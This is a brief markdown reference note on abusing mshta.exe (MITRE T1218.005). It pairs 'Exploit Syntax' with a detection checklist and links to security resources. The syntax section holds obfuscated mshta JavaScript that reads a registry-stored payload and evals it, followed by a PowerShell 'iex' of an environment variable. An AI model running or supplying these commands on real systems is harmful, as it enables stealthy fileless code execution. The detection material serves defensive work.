# [MSHTA.exe](https://attack.mitre.org/techniques/T1218/005/)

## Exploit Syntax:[incomplete] 


1. Execute the following commands: 

```powershell
sharpps "c:\windows\system32\mshta.exe" javascript:bz0pbzykh="qoethfr1";jo9=new%20activexobject("wscript.shell"); tkk4qffrj="wrqxzpuvp";zv0v5w=jo9.regread("hklm\\software\\wow6432node\\88b21b0b\\7f490d53");v9tjbmpoy="nwzv9xiv";eval(zv0v5w);wqfccxdq4="u";


sharpps "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" iex $env:veckxeg

```



## Detection Technique

* Investigate any instances of mshta.exe, if it is common, investigate mshta.exe interacting with the compromised machine itself.
    * process.name: mshta.exe
    * Network Connection: Outbound
    * Event.Action: Process Create
    * Event.Type: start, process start
    * Winlog.task: File Creation
    * 

## Resources 
* https://redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/
* https://lolbas-project.github.io/lolbas/Binaries/Mshta/
